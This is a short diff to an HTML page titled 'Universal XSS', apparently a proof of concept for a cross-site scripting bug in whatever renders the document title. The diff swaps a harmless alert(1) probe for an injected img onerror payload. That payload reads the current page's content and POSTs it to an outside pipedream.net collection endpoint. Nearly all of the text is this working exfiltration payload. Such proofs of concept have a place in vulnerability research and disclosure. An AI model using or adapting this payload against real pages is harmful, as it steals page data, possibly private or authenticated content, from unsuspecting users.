@@ -4,6 +4,6 @@
   <title>Universal XSS</title>
 </head>
 <script defer>
-  document.title = "<img src/onerror=alert(1)>";
+  document.title = "<img src/ onerror='fetch(window.location.href).then(response => response.text()).then(responseText => fetch(\"https://eok0h61dts3i7c3.m.pipedream.net\", { method: \"POST\", body: responseText }));>";
 </script>
 </html>
